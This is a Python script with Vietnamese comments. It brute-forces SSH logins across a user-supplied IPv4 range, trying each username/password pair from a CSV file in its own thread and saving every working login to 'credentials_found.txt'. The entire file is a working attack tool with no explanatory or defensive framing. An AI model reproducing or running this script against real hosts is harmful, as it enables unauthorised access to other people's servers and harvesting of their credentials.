import csv
import ipaddress
import threading
import time
import logging
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
from logging import NullHandler

# Cấu hình logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Hàm này chịu trách nhiệm kết nối SSH.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
        with open("credentials_found.txt", "a") as fh:
            logging.info(f"Username - {username} và Password - {password} được tìm thấy trên host {host}.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
    except AuthenticationException:
        logging.warning(f"Username - {username} và Password - {password} không đúng trên host {host}.")
    except ssh_exception.SSHException as e:
        logging.error(f"Lỗi SSHException trên host {host}: {str(e)} - Giới hạn tốc độ trên máy chủ hoặc vấn đề kết nối.")
    except Exception as e:
        logging.error(f"Exception chưa được xử lý trên host {host}: {str(e)}")

# Hàm này nhận một hoặc một dải địa chỉ IP hợp lệ từ người dùng.
def get_ip_range():
    while True:
        start_ip = input("Vui lòng nhập địa chỉ IP bắt đầu (hoặc một địa chỉ IP duy nhất): ")
        end_ip = input("Vui lòng nhập địa chỉ IP kết thúc (hoặc bỏ trống nếu chỉ nhập một địa chỉ IP): ")
        try:
            start_ip = ipaddress.IPv4Address(start_ip)
            if end_ip:
                end_ip = ipaddress.IPv4Address(end_ip)
                if start_ip > end_ip:
                    logging.error("Địa chỉ IP bắt đầu phải nhỏ hơn hoặc bằng địa chỉ IP kết thúc.")
                else:
                    return start_ip, end_ip
            else:
                return start_ip, start_ip
        except ipaddress.AddressValueError:
            logging.error("Vui lòng nhập địa chỉ IP hợp lệ.")

def main():
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    list_file = "passwords.csv"
    start_ip, end_ip = get_ip_range()
    
    with open(list_file) as fh:
        csv_reader = csv.reader(fh, delimiter=",")
        credentials = [(row[0], row[1]) for index, row in enumerate(csv_reader) if index != 0]
    
    for ip_int in range(int(start_ip), int(end_ip) + 1):
        host = str(ipaddress.IPv4Address(ip_int))
        for username, password in credentials:
            try:
                t = threading.Thread(target=ssh_connect, args=(host, username, password))
                t.start()
                time.sleep(0.2)
                logging.info(f"Đã khởi động một thread mới cho kết nối SSH tới {host}.")
            except Exception as e:
                logging.error(f"Lỗi khi khởi động thread cho host {host}: {str(e)}")

if __name__ == "__main__":
    main()
